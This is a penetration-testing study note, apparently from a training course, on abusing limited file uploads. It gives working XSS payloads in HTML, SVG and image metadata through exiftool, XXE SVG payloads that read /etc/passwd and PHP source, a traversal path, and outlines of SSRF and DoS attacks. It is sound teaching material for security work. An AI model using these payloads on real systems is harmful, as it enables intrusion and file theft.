# Limited File Uploads

## Overview

Even if arbitrary file upload is not possible, limited file uploads can still lead to serious vulnerabilities.

Some upload forms securely restrict dangerous extensions like:

- `.php`
    
- `.aspx`
    
- `.jsp`
    

However, certain allowed file types can still be abused:

- SVG
    
- HTML
    
- XML
    
- PDF
    
- DOCX
    
- PPTX
    
- Images with metadata
    

These file types may allow:

- XSS
    
- XXE
    
- SSRF
    
- DoS
    

---

# Importance of Fuzzing Allowed Extensions

Fuzzing allowed file extensions helps identify:

- which file types are accepted
    
- which attacks are possible
    
- whether special parsers/viewers are used
    

Example targets:

- `.svg`
    
- `.xml`
    
- `.html`
    
- `.pdf`
    
- `.docx`
    

---

# XSS Through File Uploads

## Concept

Certain uploaded files can contain JavaScript.

When another user opens the uploaded file:

- JavaScript executes in browser
    
- Stored XSS occurs
    

---

# HTML File XSS

## Idea

HTML files cannot execute server-side code like PHP.

But they can execute JavaScript in browser.

---

## Example

Malicious HTML file:

```html
<script>alert(window.origin)</script>
```

If uploaded and visited:

- script executes
    
- XSS occurs
    

---

## Impact

Can be used for:

- Stored XSS
    
- CSRF
    
- Session theft
    
- Phishing
    

---

# XSS Through Image Metadata

## Concept

Some applications display image metadata after upload.

Metadata fields:

- Comment
    
- Artist
    
- Author
    

can contain malicious payloads.

---

## Injecting XSS Into Metadata

Command:

```bash
exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
```

---

## Checking Metadata

Command:

```bash
exiftool HTB.jpg
```

Output:

```text
Comment : "><img src=1 onerror=alert(window.origin)>
```

---

## Explanation

Payload:

```html
"><img src=1 onerror=alert(window.origin)>
```

Breakdown:

- `">` closes existing HTML attribute/tag
    
- `<img src=1>` creates invalid image
    
- `onerror=` executes JavaScript
    

---

## Result

If application displays metadata:

- JavaScript executes
    
- Stored XSS triggered
    

---

# MIME-Type Manipulation for XSS

If image MIME-Type is changed to:

```text
text/html
```

Some applications may render image as HTML document.

This may trigger:

- embedded scripts
    
- XSS payloads
    

even if metadata is not displayed.

---

# SVG-Based XSS

## Why SVG is Dangerous

SVG is XML-based.

Since SVG supports scripts:

- JavaScript can be embedded inside SVG
    

---

## Malicious SVG Example

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg xmlns="http://www.w3.org/2000/svg"
version="1.1"
width="1"
height="1">

<rect x="1" y="1" width="1" height="1"
fill="green" stroke="black" />

<script type="text/javascript">
alert(window.origin);
</script>

</svg>
```

---

## Explanation

### XML Declaration

```xml
<?xml version="1.0" encoding="UTF-8"?>
```

Defines XML version and encoding.

---

### SVG Root Element

```xml
<svg xmlns="http://www.w3.org/2000/svg">
```

Defines SVG document.

---

### JavaScript Payload

```xml
<script type="text/javascript">
alert(window.origin);
</script>
```

Executes JavaScript when SVG loads.

---

## Result

When image is viewed:

- XSS executes automatically
    

---

# XXE Through File Uploads

## Concept

XML parsers may process external entities.

Attackers can abuse this to:

- read files
    
- access internal services
    
- perform SSRF
    

---

# XXE Using SVG

## Payload To Read `/etc/passwd`

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg>&xxe;</svg>
```

---

## Explanation

### ENTITY Definition

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```

Creates entity:

```text
&xxe;
```

which reads local file:

```text
/etc/passwd
```

---

### Entity Usage

```xml
<svg>&xxe;</svg>
```

Displays file content inside SVG.

---

## Result

When SVG is processed:

- `/etc/passwd` contents may appear on page
    

---

# Reading PHP Source Code With XXE

## Payload

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
<!ENTITY xxe SYSTEM
"php://filter/convert.base64-encode/resource=index.php">
]>
<svg>&xxe;</svg>
```

---

## Explanation

### php://filter

PHP stream wrapper.

---

### convert.base64-encode

Encodes file contents in base64.

---

### resource=index.php

Reads:

```text
index.php
```

---

## Why Base64?

Raw PHP source may break XML parsing.

Base64 safely displays source code.

---

## Result

Application returns:

- base64 encoded PHP source
    

Attacker decodes it to view source code.

---

# Importance of Source Code Disclosure

Reading source code helps identify:

- upload directories
    
- allowed extensions
    
- file naming schemes
    
- hidden endpoints
    
- vulnerabilities
    

---

# XXE in Other File Types

If application parses these documents:

- XXE may still be possible

# SSRF Through XXE

## Concept

XXE can request internal resources.

Possible targets:

- internal APIs
    
- localhost services
    
- cloud metadata endpoints
    

---

## Result

Can lead to:

- internal enumeration
    
- access to private services
    
- privilege escalation
    

---

# DoS Through File Uploads

## 1. XXE-Based DoS

Malicious XML entities may:

- consume CPU
    
- consume memory
    
- crash parser
    

---

# 2. ZIP Decompression Bomb

## Concept

Nested ZIP archives decompress into huge data.

---

## Result

Server:

- consumes storage
    
- consumes memory
    
- crashes
    

---

# 3. Pixel Flood Attack

## Concept

Modify image metadata to fake huge dimensions.

Example:

```text
0xffff x 0xffff
```

Result:

- perceived image size becomes extremely large
    

---

## Impact

Application allocates huge memory:

- memory exhaustion
    
- server crash
    

---

# 4. Large File Upload DoS

## Concept

If upload size is unrestricted:

- attacker uploads huge files
    

---

## Impact

Can:

- fill disk space
    
- slow server
    
- crash application
    

---

# 5. Directory Traversal Uploads

## Example

```text
../../../etc/passwd
```

---

## Concept

If upload path is vulnerable:

- files may overwrite system files
    
- server may crash
